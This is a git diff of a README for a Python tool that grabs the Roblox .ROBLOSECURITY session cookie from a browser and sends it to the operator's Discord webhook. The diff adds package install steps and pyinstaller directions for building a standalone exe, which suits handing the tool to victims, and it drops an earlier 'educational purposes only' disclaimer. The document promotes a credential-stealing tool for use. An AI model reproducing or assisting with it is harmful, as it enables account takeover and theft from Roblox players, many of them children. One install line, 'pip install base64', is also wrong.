@@ -1,14 +1,33 @@
-# Python Roblox Cookie Grabber
+# 🔊 DeWare .roblosecuity Grabber
 
-A simple Python application that grabs .ROBLOSECURITY Cookie that lets you to login with it.
+a python code that grabs the .roblosecurity and sends it to your discord webhook
 
-## Functions
+**J[Discord](https://discord.gg/FQkRFbzY6E)**
 
-- [x] Grab .ROBLOSECURITY
-- [ ] Check if Cookie is still usable
-- [ ] Send account information
-- [ ] Send PC information
+## 🔧 Installation
 
-### Note
+Use the package manager [pip](https://pip.pypa.io/en/stable/) to install needed packages.
 
-This application is for educational purposes only. Don't use it for illegal activites!
+```bash
+pip install browser_cookie3
+pip install discord_webhook 
+pip install base64 / not sure
+```
+
+## 💡 Features
+- **Grab .ROBLOSECURITY**
+
+## 🎶 How to convert it into exe
+
+```bash
+pip install pyinstaller
+```
+
+- go to cmd and execute following command:
+```bash
+pyinstaller main.py --onefile --icon=NONE
+```
+
+## ⚠️ Note
+
+its a very old project so if it doesnt work idk why
